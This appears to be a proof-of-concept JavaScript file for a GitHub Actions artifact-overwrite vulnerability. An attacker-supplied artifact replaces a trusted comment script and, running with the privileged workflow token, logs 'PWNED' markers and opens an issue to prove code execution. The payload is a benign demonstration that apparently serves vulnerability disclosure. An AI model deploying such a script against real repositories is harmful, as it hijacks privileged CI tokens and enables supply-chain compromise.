/**
 * Attacker-controlled file shipped inside the "output" artifact.
 */
export default async function ({ github, context, core, output }) {
  console.log("PWNED_ARTIFACT_OVERWROTE_TRUSTED_SCRIPT", JSON.stringify(output));
  const { owner, repo } = context.repo;
  try {
    const res = await github.rest.issues.create({
      owner,
      repo,
      title: "poc: arbitrary code executed with the privileged token",
      body: "RCE via artifact overwrite of tools/pkg.pr.new-comment.mjs",
    });
    console.log("PRIVILEGED_API_OK issues.create", res.status, res.data.number);
  } catch (e) {
    console.log("PRIVILEGED_API_ERR", e.message);
  }
}
